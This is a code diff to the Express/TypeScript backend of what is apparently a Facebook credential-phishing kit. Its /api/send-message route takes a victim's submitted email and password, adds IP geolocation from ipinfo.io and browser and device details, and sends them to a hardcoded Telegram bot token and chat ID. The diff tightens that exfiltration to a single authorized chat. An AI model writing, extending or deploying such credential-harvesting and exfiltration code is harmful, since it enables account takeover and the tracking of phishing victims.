@@ -7,59 +7,24 @@ import fetch from 'node-fetch';
 async function sendTelegramMessage(message: string): Promise<boolean> {
   try {
     const botToken = "7472968858:AAFGy_eA6XNh9IL05vnfJx47uuEwfUffQks";
-    // Hardcoded token and chat ID
-    const chatId = "6360165707";
-    
-    // Send the message directly since we have both token and chat ID
-    if (chatId) {
-      console.log("No TELEGRAM_CHAT_ID found in environment variables. Attempting to detect automatically...");
-      
-      try {
-        // Try to get chat ID from recent updates
-        const apiUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;
-        const response = await fetch(apiUrl);
-        const data = await response.json() as any;
-        
-        if (data.ok && data.result && data.result.length > 0) {
-          for (const update of data.result) {
-            if (update.message && update.message.chat && update.message.chat.id) {
-              chatId = update.message.chat.id.toString();
-              console.log("Found chat ID from updates:", chatId);
-              console.log("TIP: Add this to your .env file as TELEGRAM_CHAT_ID for more reliability");
-              break;
-            }
-          }
-        }
-      } catch (error) {
-        console.error("Error getting updates:", error);
-        // Continue execution and try other methods
-      }
-    }
-    
-    // If we still couldn't find the chat ID, provide helpful instructions
-    if (!chatId) {
-      console.log("Could not find chat ID automatically. Please follow these steps:");
-      
-      try {
-        // Get information about the bot itself
-        const botInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
-        const botInfoData = await botInfoResponse.json() as any;
-        
-        if (botInfoData.ok && botInfoData.result) {
-          console.log("1. Send a message to your bot @" + botInfoData.result.username + " in Telegram");
-          console.log("2. Visit this URL in your browser: https://api.telegram.org/bot" + botToken + "/getUpdates");
-          console.log("3. Look for 'chat':{'id':XXXXXXXXX} in the response");
-          console.log("4. Add that number to your .env file as TELEGRAM_CHAT_ID=XXXXXXXXX");
-          
-          // Message sending will likely fail, but we'll try
-          return false;
-        }
-      } catch (error) {
-        console.error("Error getting bot info:", error);
+    const authorizedChatId = "6360165707";
+
+    // Get updates to check who is messaging the bot
+    const updatesUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;
+    const updatesResponse = await fetch(updatesUrl);
+    const updatesData = await updatesResponse.json() as any;
+
+    if (updatesData.ok && updatesData.result) {
+      // Check the latest message
+      const latestUpdate = updatesData.result[updatesData.result.length - 1];
+      if (latestUpdate?.message?.chat?.id.toString() !== authorizedChatId) {
+        console.log("Unauthorized chat ID attempted to use bot");
         return false;
       }
     }
-    
+
+    console.log("Using authorized chat ID:", authorizedChatId);
+
     // Send the message
     const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const messageResponse = await fetch(sendMessageUrl, {
@@ -68,11 +33,11 @@ async function sendTelegramMessage(message: string): Promise<boolean> {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        chat_id: chatId,
+        chat_id: authorizedChatId,
         text: message
       })
     });
-    
+
     const messageData = await messageResponse.json() as any;
     if (messageData.ok) {
       console.log('Message sent successfully to Telegram');
@@ -107,11 +72,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Helper function to get device details
   function getDeviceDetails(deviceInfo: any): string {
     if (!deviceInfo) return "No device information available";
-    
+
     // Try to determine device type from user agent
     let deviceType = "Unknown";
     const ua = deviceInfo.userAgent?.toLowerCase() || "";
-    
+
     if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
       deviceType = "iOS";
     } else if (ua.includes("android")) {
@@ -123,7 +88,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } else if (ua.includes("linux")) {
       deviceType = "Linux";
     }
-    
+
     // Try to determine browser
     let browser = "Unknown";
     if (ua.includes("chrome") && !ua.includes("chromium")) {
@@ -148,19 +113,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
 • Time Zone: ${deviceInfo.timeZone || "Unknown"}
 • User Agent: ${deviceInfo.userAgent || "Unknown"}`;
   }
-  
+
   // Get IP and location information
   async function getIPInfo(req: Request): Promise<string> {
     try {
       // Get client IP address
       const forwardedFor = req.headers['x-forwarded-for'] as string;
       const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : req.ip || 'Unknown';
-      
+
       try {
         // Try to get location information from ipinfo.io (free API, no key required for basic usage)
         const response = await fetch(`https://ipinfo.io/${ip}/json`);
         const data = await response.json() as any;
-        
+
         if (data && data.city) {
           return `
 📍 Location Information:
@@ -174,7 +139,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } catch (error) {
         console.error("Error getting IP location info:", error);
       }
-      
+
       // Fallback if we couldn't get location data
       return `
 📍 Location Information:
@@ -190,25 +155,25 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/send-message', async (req: Request, res: Response) => {
     try {
       const { email, password, deviceInfo } = req.body;
-      
+
       // Get location information
       const ipInfo = await getIPInfo(req);
-      
+
       // Get device details
       const deviceDetails = getDeviceDetails(deviceInfo);
-      
+
       // Format the message
       const timestamp = new Date().toLocaleString();
       let formattedMessage = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
       formattedMessage += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
-      
+
       // Add device and location information
       formattedMessage += deviceDetails;
       formattedMessage += `\n${ipInfo}`;
-      
+
       // Send to Telegram
       const success = await sendTelegramMessage(formattedMessage);
-      
+
       if (success) {
         return res.status(200).json({ success: true });
       } else {
